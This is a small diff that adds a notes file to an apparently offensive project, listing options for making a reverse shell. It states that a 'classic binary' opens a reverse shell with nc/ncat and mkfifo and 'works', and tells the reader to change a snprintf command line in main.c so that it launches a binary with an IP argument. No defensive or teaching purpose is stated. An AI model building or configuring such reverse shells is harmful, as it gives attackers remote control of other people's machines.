@@ -1,0 +1,6 @@
+Options to make reverse shell:
+
+- classic binary. It creates a reverse shell using nc/ncat and mkfifo. It works.
+Change the snprintf(command ...) in main.c
+to:
+snprintf(command, 100, "<path-to-binary> %s", IP);
